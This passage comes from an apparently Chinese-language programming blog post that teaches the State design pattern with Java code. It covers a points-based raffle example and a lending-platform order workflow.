class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.state;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 不能抽奖状态</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NoRaffleState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">State</span> &#123;<br><br>    <span class="hljs-comment">// 初始化时传入活动引用，扣除积分后改变其状态</span><br>    RaffleActivity activity;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">NoRaffleState</span><span class="hljs-params">(RaffleActivity activity)</span> &#123;<br>        <span class="hljs-built_in">this</span>.activity = activity;<br>    &#125;<br><br>    <span class="hljs-comment">// 当前状态可以扣积分 , 扣除后，将状态设置成可以抽奖状态</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deductMoney</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;扣除50积分成功，您可以抽奖了&quot;</span>);<br>        activity.setState(activity.getCanRaffleState());<br>    &#125;<br><br>    <span class="hljs-comment">// 当前状态不能抽奖</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">raffle</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;扣了积分才能抽奖喔！&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 当前状态不能发奖品</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dispensePrize</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;不能发放奖品&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>RaffleActivity.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.state;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 抽奖活动 //</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RaffleActivity</span> &#123;<br><br>    <span class="hljs-comment">// state 表示活动当前的状态，是变化</span><br>    <span class="hljs-type">State</span> <span class="hljs-variable">state</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-comment">// 奖品数量</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// 四个属性，表示四种状态</span><br>    <span class="hljs-type">State</span> <span class="hljs-variable">noRafflleState</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoRaffleState</span>(<span class="hljs-built_in">this</span>);<br>    <span class="hljs-type">State</span> <span class="hljs-variable">canRaffleState</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CanRaffleState</span>(<span class="hljs-built_in">this</span>);<br><br>    <span class="hljs-type">State</span> <span class="hljs-variable">dispenseState</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DispenseState</span>(<span class="hljs-built_in">this</span>);<br>    <span class="hljs-type">State</span> <span class="hljs-variable">dispensOutState</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DispenseOutState</span>(<span class="hljs-built_in">this</span>);<br><br>    <span class="hljs-comment">//构造器</span><br>    <span class="hljs-comment">//1. 初始化当前的状态为 noRafflleState（即不能抽奖的状态）</span><br>    <span class="hljs-comment">//2. 初始化奖品的数量 </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RaffleActivity</span><span class="hljs-params">(<span class="hljs-type">int</span> count)</span> &#123;<br>        <span class="hljs-built_in">this</span>.state = getNoRafflleState();<br>        <span class="hljs-built_in">this</span>.count = count;<br>    &#125;<br><br>    <span class="hljs-comment">//扣分, 调用当前状态的 deductMoney</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">debuctMoney</span><span class="hljs-params">()</span> &#123;<br>        state.deductMoney();<br>    &#125;<br><br>    <span class="hljs-comment">//抽奖 </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">raffle</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 如果当前的状态是抽奖成功</span><br>        <span class="hljs-keyword">if</span> (state.raffle()) &#123;<br>            <span class="hljs-comment">//领取奖品</span><br>            state.dispensePrize();<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> State <span class="hljs-title function_">getState</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> state;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setState</span><span class="hljs-params">(State state)</span> &#123;<br>        <span class="hljs-built_in">this</span>.state = state;<br>    &#125;<br><br>    <span class="hljs-comment">//这里请大家注意，每领取一次奖品，count--</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getCount</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">curCount</span> <span class="hljs-operator">=</span> count;<br>        count--;<br>        <span class="hljs-keyword">return</span> curCount;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCount</span><span class="hljs-params">(<span class="hljs-type">int</span> count)</span> &#123;<br>        <span class="hljs-built_in">this</span>.count = count;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> State <span class="hljs-title function_">getNoRafflleState</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> noRafflleState;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNoRafflleState</span><span class="hljs-params">(State noRafflleState)</span> &#123;<br>        <span class="hljs-built_in">this</span>.noRafflleState = noRafflleState;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> State <span class="hljs-title function_">getCanRaffleState</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> canRaffleState;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCanRaffleState</span><span class="hljs-params">(State canRaffleState)</span> &#123;<br>        <span class="hljs-built_in">this</span>.canRaffleState = canRaffleState;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> State <span class="hljs-title function_">getDispenseState</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> dispenseState;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDispenseState</span><span class="hljs-params">(State dispenseState)</span> &#123;<br>        <span class="hljs-built_in">this</span>.dispenseState = dispenseState;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> State <span class="hljs-title function_">getDispensOutState</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> dispensOutState;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDispensOutState</span><span class="hljs-params">(State dispensOutState)</span> &#123;<br>        <span class="hljs-built_in">this</span>.dispensOutState = dispensOutState;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>State.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.state;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 状态抽象类</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">State</span> &#123;<br><br>   <br>   <span class="hljs-comment">// 扣除积分 - 50</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deductMoney</span><span class="hljs-params">()</span>;<br><br>    <span class="hljs-comment">// 是否抽中奖品</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">raffle</span><span class="hljs-params">()</span>;<br><br>    <span class="hljs-comment">// 发放奖品</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">dispensePrize</span><span class="hljs-params">()</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">--------</span><span class="hljs-comment">第1次抽奖</span><span class="hljs-literal">----------</span><br><span class="hljs-comment">扣除50积分成功，您可以抽奖了</span><br><span class="hljs-comment">正在抽奖，请稍等！</span><br><span class="hljs-comment">恭喜中奖了</span><br><span class="hljs-literal">--------</span><span class="hljs-comment">第2次抽奖</span><span class="hljs-literal">----------</span><br><span class="hljs-comment">扣除50积分成功，您可以抽奖了</span><br><span class="hljs-comment">正在抽奖，请稍等！</span><br><span class="hljs-comment">很遗憾，奖品发送完了</span><br><span class="hljs-literal">--------</span><span class="hljs-comment">第3次抽奖</span><span class="hljs-literal">----------</span><br><span class="hljs-comment">奖品发送完了，请下次再参加</span><br><span class="hljs-comment">奖品发送完了，请下次再参加</span><br><span class="hljs-literal">--------</span><span class="hljs-comment">第4次抽奖</span><span class="hljs-literal">----------</span><br><span class="hljs-comment">奖品发送完了，请下次再参加</span><br><span class="hljs-comment">奖品发送完了，请下次再参加</span><br><span class="hljs-literal">--------</span><span class="hljs-comment">第5次抽奖</span><span class="hljs-literal">----------</span><br><span class="hljs-comment">奖品发送完了，请下次再参加</span><br><span class="hljs-comment">奖品发送完了，请下次再参加</span><br></code></pre></td></tr></table></figure><h3 id="状态模式在实际项目-借贷平台-源码剖析"><a class="markdownIt-Anchor" href="#状态模式在实际项目-借贷平台-源码剖析"></a> 状态模式在实际项目-借贷平台 源码剖析</h3><ol><li>借贷平台的订单，有审核-发布-抢单 等等 步骤，随着操作的不同，会改变订单的状态, 项目中的这个模块实现就会使用到状态模式</li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230105154135954.png" alt="image-20230105154135954" /></p><p><code>AbstractState.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.state.money;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AbstractState</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">State</span> &#123;<br><br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">RuntimeException</span> <span class="hljs-variable">EXCEPTION</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;操作流程不允许&quot;</span>);<br><br>   <span class="hljs-comment">//抽象类，默认实现了 State 接口的所有方法</span><br>   <span class="hljs-comment">//该类的所有方法，其子类(具体的状态类)，可以有选择的进行重写</span><br>   <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        <span class="hljs-keyword">throw</span> EXCEPTION;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkFailEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        <span class="hljs-keyword">throw</span> EXCEPTION;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">makePriceEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        <span class="hljs-keyword">throw</span> EXCEPTION;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">acceptOrderEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        <span class="hljs-keyword">throw</span> EXCEPTION;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">notPeopleAcceptEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        <span class="hljs-keyword">throw</span> EXCEPTION;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">payOrderEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        <span class="hljs-keyword">throw</span> EXCEPTION;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">orderFailureEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        <span class="hljs-keyword">throw</span> EXCEPTION;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">feedBackEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        <span class="hljs-keyword">throw</span> EXCEPTION;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>AllState.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.state.money;<br><br><span class="hljs-comment">//各种具体状态类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">FeedBackState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractState</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCurrentState</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> StateEnum.FEED_BACKED.getValue();<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GenerateState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractState</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>      context.setState(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ReviewState</span>());<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkFailEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>      context.setState(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FeedBackState</span>());<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCurrentState</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> StateEnum.GENERATE.getValue();<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NotPayState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractState</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">payOrderEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>      context.setState(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PaidState</span>());<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">feedBackEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>      context.setState(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FeedBackState</span>());<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCurrentState</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> StateEnum.NOT_PAY.getValue();<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PaidState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractState</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">feedBackEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>      context.setState(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FeedBackState</span>());<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCurrentState</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> StateEnum.PAID.getValue();<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PublishState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractState</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">acceptOrderEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>      <span class="hljs-comment">//把当前状态设置为  NotPayState。。。</span><br>      <span class="hljs-comment">//至于应该变成哪个状态，有流程图来决定</span><br>      context.setState(<span class="hljs-keyword">new</span> <span class="hljs-title class_">NotPayState</span>());<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">notPeopleAcceptEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>      context.setState(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FeedBackState</span>());<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCurrentState</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> StateEnum.PUBLISHED.getValue();<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ReviewState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractState</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">makePriceEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>      context.setState(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PublishState</span>());<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCurrentState</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> StateEnum.REVIEWED.getValue();<br>   &#125;<br><br>&#125;```<br>`ClientTest.java`<br>​```java<br><span class="hljs-keyword">package</span> io.xtwoy.state.money;<br><br><span class="hljs-comment">/**测试类*/</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClientTest</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//创建context 对象</span><br>      <span class="hljs-type">Context</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Context</span>();<br>        <span class="hljs-comment">//将当前状态设置为 PublishState</span><br>      context.setState(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PublishState</span>());<br>        System.out.println(context.getCurrentState());<br>        <br><span class="hljs-comment">//        //publish --&gt; not pay</span><br>        context.acceptOrderEvent(context);<br><span class="hljs-comment">//        //not pay --&gt; paid</span><br>        context.payOrderEvent(context);<br><span class="hljs-comment">//        // 失败, 检测失败时，会抛出异常</span><br><span class="hljs-comment">//        try &#123;</span><br><span class="hljs-comment">//         context.checkFailEvent(context);</span><br><span class="hljs-comment">//         System.out.println(&quot;流程正常..&quot;);</span><br><span class="hljs-comment">//    &#125; catch (Exception e) &#123;</span><br><span class="hljs-comment">//       // <span class="hljs-doctag">TODO:</span> handle exception</span><br><span class="hljs-comment">//       System.out.println(e.getMessage());</span><br><span class="hljs-comment">//    &#125;</span><br>        <br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Context.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 